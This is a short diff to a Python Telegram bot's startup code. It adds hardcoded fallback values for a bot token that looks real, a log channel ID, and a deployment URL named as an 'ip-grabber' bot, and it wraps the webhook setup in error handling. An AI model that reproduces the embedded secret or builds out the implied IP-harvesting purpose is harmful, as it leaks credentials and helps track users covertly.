@@ -3,9 +3,9 @@ from telebot import types
 import os
 import traceback
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-WEB_URL = os.environ.get("WEB_URL")
-LOG_CHANNEL = os.environ.get("LOG_CHANNEL")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg")
+WEB_URL = os.environ.get("WEB_URL", "https://ip-grabber-bot-production.up.railway.app")
+LOG_CHANNEL = os.environ.get("LOG_CHANNEL", "-1002290475903")
 
 print("Bot starting...")
 print("BOT_TOKEN loaded successfully")
@@ -22,7 +22,13 @@ except Exception as e:
     print("Failed to remove webhook:")
     print(traceback.format_exc())
 
-bot.set_webhook(url=f"{WEB_URL}/webhook")
+print("Setting webhook...")
+try:
+    bot.set_webhook(url=f"{WEB_URL}/webhook")
+    print("Webhook set successfully:", f"{WEB_URL}/webhook")
+except Exception as e:
+    print("Failed to set webhook:")
+    print(traceback.format_exc())
 
 @bot.chat_join_request_handler()
 def handle_join_request(request: types.ChatJoinRequest):
